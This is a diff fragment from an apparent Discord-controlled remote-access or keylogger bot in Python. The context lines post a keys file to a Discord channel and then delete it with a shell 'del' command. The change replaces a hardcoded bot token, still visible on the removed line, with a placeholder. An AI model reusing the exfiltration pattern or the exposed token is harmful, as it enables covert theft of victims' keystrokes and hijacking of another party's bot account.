@@ -145,4 +145,4 @@ async def on_message(message):
             await message.channel.send("[*] Command successfuly executed", file=file)
             os.popen(f"del {file_keys}")
 
-client.run('MTEyMDc5MDg5NTQ3ODk4MDY0OQ.GDbAxs.YGfSuv29umBnJpZcyXsamV3yaO5tqsrViOFGTA')
+client.run('Here-Bot-Token')
